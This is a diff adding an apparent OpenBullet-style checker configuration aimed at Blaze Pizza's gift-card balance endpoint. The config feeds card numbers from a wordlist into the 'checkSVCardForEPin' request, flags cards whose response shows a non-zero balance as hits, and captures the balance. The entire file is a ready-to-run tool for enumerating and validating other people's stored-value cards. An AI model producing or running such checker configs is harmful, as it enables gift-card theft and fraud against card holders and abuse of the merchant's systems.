@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "Blaze Pizza",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-02T05:32:03.6718563+00:00",
+  "AdditionalInfo": "",
+  "Author": "yzy",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://blazepizza.alohaenterprise.com:4430/servlet/MemberLinkSVServlet?companyID=bla09&requestType=checkSVCardForEPin&cardNumber={card}" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST_LOGIN REQUEST POST "https://blazepizza.alohaenterprise.com:4430/servlet/MemberLinkSVServlet?" AutoRedirect=TRUE 
+  CONTENT "companyID=bla09&requestType=checkSVCardForEPin&cardNumber=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "{\"cardBalance\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"cardBalance\":0" 
+PARSE "<SOURCE>" LR "{\"cardBalance\":" ",\"cardNumber\"" Recursive=FALSE -> CAP "Balance" "" "" 
